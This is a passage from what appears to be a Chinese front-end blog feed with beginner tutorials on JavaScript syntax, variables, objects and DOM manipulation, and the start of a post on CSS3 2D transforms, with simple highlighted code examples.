class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">a = <span class="hljs-number">5</span>;<br>b = <span class="hljs-number">6</span>;<br>c = a + b;<br><br>a = <span class="hljs-number">5</span>; b = <span class="hljs-number">6</span>; c = a + b;<br></code></pre></div></td></tr></table></figure><h3 id="3-1-JavaScript-代码"><a href="#3-1-JavaScript-代码" class="headerlink" title="3.1 JavaScript 代码"></a>3.1 JavaScript 代码</h3><p>JavaScript 代码是 JavaScript 语句的序列。浏览器按照编写顺序依次执行每条语句。</p><p>使用实例：输出一个标题和两个段落</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML=<span class="hljs-string">&quot;你好 Dolly&quot;</span>;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myDIV&quot;</span>).innerHTML=<span class="hljs-string">&quot;你最近怎么样?&quot;</span>;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-JavaScript-代码块"><a href="#3-2-JavaScript-代码块" class="headerlink" title="3.2 JavaScript 代码块"></a>3.2 JavaScript 代码块</h3><p>JavaScript 可以分批地组合起来。代码块以左花括号开始，以右花括号结束。代码块的作用是一并地执行语句序列。</p><p>使用实例：输出一个标题和两个段落</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML=<span class="hljs-string">&quot;你好Dolly&quot;</span>;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myDIV&quot;</span>).innerHTML=<span class="hljs-string">&quot;你最近怎么样?&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-JavaScript-语句标识符"><a href="#3-3-JavaScript-语句标识符" class="headerlink" title="3.3 JavaScript 语句标识符"></a>3.3 JavaScript 语句标识符</h3><p>JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。</p><p>JavaScript 语句标识符 (关键字) ：</p><table><thead><tr><th align="center">语句</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">break</td><td align="center">用于跳出循环。</td></tr><tr><td align="center">catch</td><td align="center">语句块，在 try 语句块执行出错时执行 catch 语句块。</td></tr><tr><td align="center">continue</td><td align="center">跳过循环中的一个迭代。</td></tr><tr><td align="center">do … while</td><td align="center">执行一个语句块，在条件语句为 true 时继续执行该语句块。</td></tr><tr><td align="center">for</td><td align="center">在条件语句为 true 时，可以将代码块执行指定的次数。</td></tr><tr><td align="center">for … in</td><td align="center">用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。</td></tr><tr><td align="center">function</td><td align="center">定义一个函数</td></tr><tr><td align="center">if … else</td><td align="center">用于基于不同的条件来执行不同的动作。</td></tr><tr><td align="center">return</td><td align="center">退出函数</td></tr><tr><td align="center">switch</td><td align="center">用于基于不同的条件来执行不同的动作。</td></tr><tr><td align="center">throw</td><td align="center">抛出（生成）错误 。</td></tr><tr><td align="center">try</td><td align="center">实现错误处理，与 catch 一同使用。</td></tr><tr><td align="center">var</td><td align="center">声明一个变量。</td></tr><tr><td align="center">while</td><td align="center">当条件语句为 true 时，执行语句块。</td></tr></tbody></table><h3 id="3-4-对代码行进行折行"><a href="#3-4-对代码行进行折行" class="headerlink" title="3.4 对代码行进行折行"></a>3.4 对代码行进行折行</h3><p>可以在文本字符串中使用反斜杠对代码行进行换行。</p><p>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;你好 \ W3Cschool!&quot;</span>);<br></code></pre></div></td></tr></table></figure><h2 id="4-JavaScript-注释"><a href="#4-JavaScript-注释" class="headerlink" title="4.JavaScript 注释"></a>4.JavaScript 注释</h2><p>JavaScript 注释可用于提高代码的可读性。</p><h3 id="4-1-单行注释"><a href="#4-1-单行注释" class="headerlink" title="4.1 单行注释"></a>4.1 单行注释</h3><p>单行注释以 // 开头。</p><p>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// 输出标题：</span><br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myH1&quot;</span>).innerHTML=<span class="hljs-string">&quot;欢迎来到我的主页&quot;</span>;<br><span class="hljs-comment">// 输出段落：</span><br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myP&quot;</span>).innerHTML=<span class="hljs-string">&quot;这是我的第一个段落。&quot;</span>;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-多行注释"><a href="#4-2-多行注释" class="headerlink" title="4.2 多行注释"></a>4.2 多行注释</h3><p>多行注释以 /* 开始，以 */ 结尾。</p><p>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">下面的这些代码会输出</span><br><span class="hljs-comment">一个标题和一个段落</span><br><span class="hljs-comment">并将代表主页的开始</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myH1&quot;</span>).innerHTML=<span class="hljs-string">&quot;欢迎来到我的主页&quot;</span>;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;myP&quot;</span>).innerHTML=<span class="hljs-string">&quot;这是我的第一个段落。&quot;</span>;<br></code></pre></div></td></tr></table></figure><h2 id="5-JavaScript-变量"><a href="#5-JavaScript-变量" class="headerlink" title="5.JavaScript 变量"></a>5.JavaScript 变量</h2><p>变量是用于存储信息的”容器”。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> y=<span class="hljs-number">6</span>;<br><span class="hljs-keyword">var</span> z=x+y;<br></code></pre></div></td></tr></table></figure><p>变量命名规则：</p><blockquote><ol><li>变量必须以字母开头</li><li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li><li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li></ol></blockquote><p>JavaScript 语句和 JavaScript 变量都对大小写敏感。</p><h3 id="5-1-声明（创建）变量"><a href="#5-1-声明（创建）变量" class="headerlink" title="5.1 声明（创建）变量"></a>5.1 声明（创建）变量</h3><p>在 JavaScript 中创建变量通常称为”声明”变量。</p><blockquote><ol><li>使用 var 关键词来声明变量：</li></ol></blockquote><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">var carname<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>变量声明之后，该变量是空的（它没有值）。如需向变量赋值，需使用等号。</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">carname</span>=<span class="hljs-string">&quot;Volvo&quot;</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>也可以在声明变量时对其赋值。</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">var carname</span>=<span class="hljs-string">&quot;Volvo&quot;</span>;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>一条语句，多个变量</li></ol></blockquote><p>可以在一条语句中声明很多变量。语句以 var 开头，并使用逗号分隔变量即可。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">var <span class="hljs-attribute">lastname</span>=<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attribute">age</span>=30, <span class="hljs-attribute">job</span>=<span class="hljs-string">&quot;carpenter&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>声明也可横跨多行。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">var <span class="hljs-attribute">lastname</span>=<span class="hljs-string">&quot;Doe&quot;</span>,        <br><span class="hljs-attribute">age</span>=30,        <br><span class="hljs-attribute">job</span>=<span class="hljs-string">&quot;carpenter&quot;</span>;<br></code></pre></div></td></tr></table></figure><h3 id="5-2-Value-undefined"><a href="#5-2-Value-undefined" class="headerlink" title="5.2 Value = undefined"></a>5.2 Value = undefined</h3><p>在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined。<br>实例：</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">var carname<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-3-重新声明变量"><a href="#5-3-重新声明变量" class="headerlink" title="5.3 重新声明变量"></a>5.3 重新声明变量</h3><p>如果重新声明 JavaScript 变量，该变量的值不会丢失。</p><p>使用实例：变量 carname 的值依然是 “Volvo”</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">var carname=<span class="hljs-string">&quot;Volvo&quot;</span><span class="hljs-comment">;        </span><br>var carname<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-JavaScript对象"><a href="#6-JavaScript对象" class="headerlink" title="6. JavaScript对象"></a>6. JavaScript对象</h2><p>对象有多个属性。类似于一个结构体。<br>示例1：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;p id=<span class="hljs-string">&quot;demo&quot;</span>&gt;&lt;/p&gt;<br><br>&lt;script&gt;<br><span class="hljs-comment">// 创建对象：</span><br><span class="hljs-keyword">var</span> car = &#123;<span class="hljs-attr">type</span>:<span class="hljs-string">&quot;porsche&quot;</span>, <span class="hljs-attr">model</span>:<span class="hljs-string">&quot;911&quot;</span>, <span class="hljs-attr">color</span>:<span class="hljs-string">&quot;white&quot;</span>&#125;;<br><br><span class="hljs-comment">// 显示对象中的数据：</span><br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML = car.type;<br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">porsche<br></code></pre></div></td></tr></table></figure><p>示例二：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person = &#123;<br>  firstName: <span class="hljs-string">&quot;Bill&quot;</span>,<br>  lastName : <span class="hljs-string">&quot;Gates&quot;</span>,<br>  id       : <span class="hljs-number">678</span>,<br>  fullName : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.firstName + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-built_in">this</span>.lastName;<br>  &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>不要把字符串、数值和布尔值声明为对象！避免字符串、数值或逻辑对象。他们会增加代码的复杂性并降低执行速度。</p><h2 id="7-JavaScript-变量学习图"><a href="#7-JavaScript-变量学习图" class="headerlink" title="7.JavaScript 变量学习图"></a>7.JavaScript 变量学习图</h2><p><img src="https://img-blog.csdnimg.cn/20210517131641412.gif"></p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-JavaScript学习（一）</title>
    <link href="/2021/05/17/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/17/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JavaScript 是世界上最流行的脚本语言。 JavaScript 是属于 web 的语言，它适用于 PC、笔记本电脑、平板电脑和移动电话。 JavaScript 被设计为向 HTML 页面增加交互性。 许多 HTML 开发者都不是程序员，但是 JavaScript 却拥有非常简单的语法。几乎每个人都有能力将小的 JavaScript 片段添加到网页中。所有现代的 HTML 页面都使用 JavaScript，可以用于改进设计、验证表单、检测浏览器、创建cookies等。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-JavaScript初来乍到"><a href="#1-JavaScript初来乍到" class="headerlink" title="1.JavaScript初来乍到"></a>1.JavaScript初来乍到</h2><h3 id="1-1-直接写入HTML输出流"><a href="#1-1-直接写入HTML输出流" class="headerlink" title="1.1 直接写入HTML输出流"></a>1.1 直接写入HTML输出流</h3><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;</span>);<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;&lt;p&gt;这是一个段落。&lt;/p&gt;&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>只能在 HTML 输出中使用 document.write。如果在文档加载完成后使用该方法，会覆盖整个文档。</p><h3 id="1-2-事件反应"><a href="#1-2-事件反应" class="headerlink" title="1.2 事件反应"></a>1.2 事件反应</h3><p>onclick 事件。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;button type=<span class="hljs-string">&quot;button&quot;</span> onclick=<span class="hljs-string">&quot;alert(&#x27;欢迎!&#x27;)&quot;</span>&gt;点我!&lt;/button&gt;<br></code></pre></div></td></tr></table></figure><p>alert() 函数在 JavaScript 中并不常用，但对于代码测试非常方便。</p><h3 id="1-3-改变HTML内容"><a href="#1-3-改变HTML内容" class="headerlink" title="1.3 改变HTML内容"></a>1.3 改变HTML内容</h3><p>用 JavaScript 来处理 HTML 内容是非常强大的功能。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>)  <span class="hljs-comment">//查找元素</span><br>x.innerHTML=<span class="hljs-string">&quot;Hello JavaScript&quot;</span>;    <span class="hljs-comment">//改变内容</span><br></code></pre></div></td></tr></table></figure><p>会经常看到 document.getElementById(“some id”)。这个方法是 HTML DOM 中定义的。DOM (Document Object Model)（文档对象模型）是用于访问 HTML 元素的正式 W3C 标准。</p><h3 id="1-4-改变HTML图像"><a href="#1-4-改变HTML图像" class="headerlink" title="1.4 改变HTML图像"></a>1.4 改变HTML图像</h3><p>实例：动态地改变 HTML 图像的来源（src）</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">changeImage</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>element=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;myimage&#x27;</span>)<br><span class="hljs-keyword">if</span> (element.src.match(<span class="hljs-string">&quot;bulbon&quot;</span>))<br> &#123;<br>  element.src=<span class="hljs-string">&quot;bulboff.gif&quot;</span>;<br>  &#125;<br><span class="hljs-keyword">else</span><br>   &#123;<br>  element.src=<span class="hljs-string">&quot;bulbon.gif&quot;</span>;<br>   &#125;<br>&#125;<br>&lt;/script&gt;<br>&lt;img id=<span class="hljs-string">&quot;myimage&quot;</span> onclick=<span class="hljs-string">&quot;changeImage()&quot;</span><br>src=<span class="hljs-string">&quot;bulboff.gif&quot;</span> width=<span class="hljs-string">&quot;100&quot;</span> height=<span class="hljs-string">&quot;180&quot;</span>&gt;<br>&lt;p&gt;点击灯泡就可以打开或关闭这盏灯&lt;/p&gt;<br></code></pre></div></td></tr></table></figure><p>其中，代码 element.src.match(“bulbon”) 的作用意思是：<br>检索 &lt;img id=”myimage” onclick=”changeImage()” src=”bulboff.gif” width=”100” height=”180”&gt; 里面 src 属性的值有没有包含 bulbon 这个字符串，如果存在字符串 bulbon，图片 src 更新为 bulboff.gif，若匹配不到 bulbon 字符串，src 则更新为 bulbon.gif。</p><p>JavaScript 能够改变任意 HTML 元素的大多数属性，而不仅仅是图片。</p><h3 id="1-5-改变HTML样式"><a href="#1-5-改变HTML样式" class="headerlink" title="1.5 改变HTML样式"></a>1.5 改变HTML样式</h3><p>改变 HTML 元素的样式，属于改变 HTML 属性的变种。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>)  <span class="hljs-comment">//找到元素</span><br>x.style.color=<span class="hljs-string">&quot;#ff0000&quot;</span>;           <span class="hljs-comment">//改变样式</span><br></code></pre></div></td></tr></table></figure><h3 id="1-6-验证输入"><a href="#1-6-验证输入" class="headerlink" title="1.6 验证输入"></a>1.6 验证输入</h3><p>JavaScript 常用于验证用户的输入。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> <span class="hljs-function"><span class="hljs-title">isNaN</span>(<span class="hljs-params">x</span>)</span> &#123;alert(<span class="hljs-string">&quot;不是数字&quot;</span>)&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="2-JavaScript知识图"><a href="#2-JavaScript知识图" class="headerlink" title="2.JavaScript知识图"></a>2.JavaScript知识图</h2><p><img src="https://img-blog.csdnimg.cn/20210517131554178.gif"></p><p><img src="https://img-blog.csdnimg.cn/2021051713161975.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131641412.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131703960.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131724439.png"></p><p><img src="https://img-blog.csdnimg.cn/20210517131756194.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131813963.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131831894.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131849306.gif"></p><p><img src="https://img-blog.csdnimg.cn/20210517131908294.gif"></p><h2 id="3-JavaScript用法"><a href="#3-JavaScript用法" class="headerlink" title="3.JavaScript用法"></a>3.JavaScript用法</h2><p>HTML 中的脚本必须位于 &lt;script&gt; 与 &lt;/script&gt; 标签之间。脚本可被放置在 HTML 页面的 &lt;body&gt; 和 &lt;head&gt; 部分中。</p><h3 id="3-1-lt-script-gt-标签"><a href="#3-1-lt-script-gt-标签" class="headerlink" title="3.1 &lt;script&gt;标签"></a>3.1 &lt;script&gt;标签</h3><p>&lt;script&gt; 和 &lt;/script&gt; 会告诉 JavaScript 在何处开始和结束。&lt;script&gt; 和 &lt;/script&gt; 之间的代码行包含了 JavaScript。<br>如：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br>alert(<span class="hljs-string">&quot;我的第一个 JavaScript&quot;</span>);  <br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>旧版本中，会在 &lt;script&gt; 标签中使用 type=”text/javascript”。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。</p><h3 id="3-2-函数和事件"><a href="#3-2-函数和事件" class="headerlink" title="3.2 函数和事件"></a>3.2 函数和事件</h3><p>需要在某个事件发生时执行代码，比如当用户点击按钮时。如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。</p><h3 id="3-3-JavaScript所放位置"><a href="#3-3-JavaScript所放位置" class="headerlink" title="3.3 JavaScript所放位置"></a>3.3 JavaScript所放位置</h3><p>可以在 HTML 文档中放入不限数量的脚本。脚本可位于 HTML 的 &lt;body&gt; 或 &lt;head&gt; 部分中，或者同时存在于两个部分中。通常的做法是把函数放入 &lt;head&gt; 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</p><p>外部JavaScript。<br>可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。外部 JavaScript 文件的文件扩展名是 .js。如需使用外部文件，在 &lt;script&gt; 标签的 “src” 属性中设置该 .js 文件：</p><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;myScript.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>可以将脚本放置于 &lt;head&gt; 或者 &lt;body&gt;中，实际运行效果与您在 &lt;script&gt; 标签中编写脚本完全一致。<br><strong>外部脚本（.js文件）不能包含 &lt;script&gt; 标签。</strong></p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS3基础知识复习（二）</title>
    <link href="/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS3 是最新的 CSS 标准。使用了层叠样式表技术，可以对网页布局、字体、颜色、背景灯效果做出控制。css3作为css的进阶版，拆分和增加了盒子模型、列表模块、语言模块 、背景边框 、文字特效 、多栏布局等等。CSS3的改变有很多，增加了文字特效，丰富了下划线样式，加入了圈重点的功能。在边框方面，有了更多的灵活性，可以更加轻松地操控渐变效果和动态效果等等。在文字效果方面，特意增加了投影。</p><p>CSS3在兼容上做了很大的功夫，并且网络浏览器也还将继续支持CSS2，因此原来的代码不需要做太多的改变，只会变得更加地轻松。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-2D转换"><a href="#1-2D转换" class="headerlink" title="1.2D转换"></a>1.2D转换</h2><p>CSS3转换，我们可以移动，比例化，反过来，旋转，和拉伸元素。<br>2D变换方法：</p><blockquote><ol><li>translate()</li><li>rotate()</li><li>scale()</li><li>skew()</li><li>matrix()</li></ol></blockquote><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">matrix(<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>)</td><td align="center">定义 2D 转换，使用六个值的矩阵。</td></tr><tr><td align="center">translate(<em>x</em>,<em>y</em>)</td><td align="center">定义 2D 转换，沿着 X 和 Y 轴移动元素。</td></tr><tr><td align="center">translateX(<em>n</em>)</td><td align="center">定义 2D 转换，沿着 X 轴移动元素。</td></tr><tr><td align="center">translateY(<em>n</em>)</td><td align="center">定义 2D 转换，沿着 Y 轴移动元素。</td></tr><tr><td align="center">scale(<em>x</em>,<em>y</em>)</td><td align="center">定义 2D 缩放转换，改变元素的宽度和高度。</td></tr><tr><td align="center">scaleX(<em>n</em>)</td><td align="center">定义 2D 缩放转换，改变元素的宽度。</td></tr><tr><td align="center">scaleY(<em>n</em>)</td><td align="center">定义 2D 缩放转换，改变元素的高度。</td></tr><tr><td align="center">rotate(<em>angle</em>)</td><td align="center">定义 2D 旋转，在参数中规定角度。</td></tr><tr><td align="center">skew(<em>x-angle</em>,<em>y-angle</em>)</td><td align="center">定义 2D 倾斜转换，沿着 X 和 Y 轴。</td></tr><tr><td align="center">skewX(<em>angle</em>)</td><td align="center">定义 2D 倾斜转换，沿着 X 轴。</td></tr><tr><td align="center">skewY(<em>angle</em>)</td><td align="center">定义 2D 倾斜转换，沿着 Y 轴。</td></tr></tbody></table><h3 id="1-1-移动-（translate-）"><a href="#1-1-移动-（translate-）" class="headerlink" title="1.1 移动 （translate() ）"></a>1.1 移动 （translate() ）</h3><p>translate()方法，根据左(X轴)和顶部(Y轴)位置给定的参数，从当前元素位置移动。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50px</span>,<span class="hljs-number">100px</span>); <span class="hljs-comment">/*从左边元素移动50个像素，并从顶部移动100像素。*/</span><br>-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50px</span>,<span class="hljs-number">100px</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50px</span>,<span class="hljs-number">100px</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="1-2-旋转（rotate-）"><a href="#1-2-旋转（rotate-）" class="headerlink" title="1.2 旋转（rotate()）"></a>1.2 旋转（rotate()）</h3><p>rotate()方法，在一个给定度数顺时针旋转的元素。负值是允许的，这样是元素逆时针旋转。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>);<span class="hljs-comment">/*顺时针旋转30度。*/</span><br>-ms-<span 